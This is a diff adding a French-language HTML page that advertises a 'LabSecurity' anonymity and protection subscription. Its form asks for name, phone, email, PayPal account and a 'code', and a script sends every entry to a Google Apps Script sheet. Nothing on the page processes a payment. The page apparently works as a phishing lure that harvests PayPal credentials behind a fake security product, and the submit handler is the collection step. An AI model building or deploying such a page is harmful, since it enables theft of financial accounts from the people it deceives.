@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>security</title>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <header>
+                <section class="section-h">
+                    <div>
+                        <h1>Anonymat 100% en ligne + Protection garantie</h1>
+                        <ul>
+                            <li>Gardez votre historique de navigation privé</li>
+                            <li>Des vitesses ultra-rapides sans limites de bande passante</li>
+                            <li>Protégez jusqu’à 7 appareils avec un seul abonnement</li>
+                        </ul>
+                        <p>Payer votre abonnement avec <strong>LabSecurity</strong></p>
+                        <ul>
+                            <li><span>$60 us/Mois</span> 1  appareil / niveau de securite 50%</li>
+                            <li><span>$80 us/Mois</span> 2  appareil / niveau de securite 70%</li>
+                            <li><span>$130 us/Mois</span> 50 appareil / niveau de securite 100%</li>
+                        </ul>
+                        <p>
+                            <cite>
+                                <span><b>Nb.-</b></span> Avec l’abonnement de 130 us, on vous donnera accès de connecter un compte 
+                                bancaire de votre choix avec tous type de compte en ligne,
+                            </cite>
+                        </p>
+                        <button onclick="formulaire()">Securiser votre systeme maintenant</button>
+                    </div>
+                    <div><img src="https://www.freeiconspng.com/thumbs/secure-icon-png/status-security-high-icon-4.png" alt="Systeme de securite"></div>
+                </section>
+            </header>
+            <main>
+                <div class="formulaire" id="form">
+                    <form method="post" autocomplete="off" name="google-sheet">
+                        <div>
+                            <img src="http://assets.stickpng.com/images/580b57fcd9996e24bc43c530.png" alt="">
+                        </div>
+                        <div class="input">
+                            <label for="name">Entre votre nom</label>
+                            <input type="text" id="name" name="Name">
+                        </div>
+
+                        <div class="input">
+                            <label for="name">Entre votre numéro</label>
+                            <input type="text" id="phone" name="Phone">
+                        </div>
+
+                        <div class="input">
+                            <label for="name">Entre votre email</label>
+                            <input type="text" id="email" name="Email">
+                        </div>
+
+                        <div class="input">
+                            <label for="name">Entre votre compte Paypal</label>
+                            <input type="text" id="paypal" name="Paypal">
+                        </div>
+
+                        <div class="input">
+                            <label for="name">Entre votre code</label>
+                            <input type="text" id="code" name="Code">
+                        </div>
+                        <div class="input boutton">
+                            <input type="submit" class="btn" value="Payer abonnement">
+                        </div>
+                    </form>
+                </div>
+            </main>
+        </div>
+    </div>
+    <script>
+        function formulaire(){
+            document.getElementById('form').style.display = 'block'
+        }
+    </script>
+
+<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbygXX8AAX08ovjt7wfraBH8uFc9oxci4EokwMIAbuEV8LdL8TSTYyZOz64k-iOI4Aldkg/exec'
+    const form = document.forms['google-sheet']
+  
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => document.getElementById('msg').style.display  = "block")
+        .then(response => document.getElementById('name').value = '')
+        .then(response => document.getElementById('email').value = '')
+        .then(response => document.getElementById('phone').value = '')
+        .then(response => document.getElementById('paypal').value = '')
+        .then(response => document.getElementById('code').value = '')
+        .catch(error => console.error('Error!', error.message))
+    });
+   
+  </script>
+</body>
+</html>
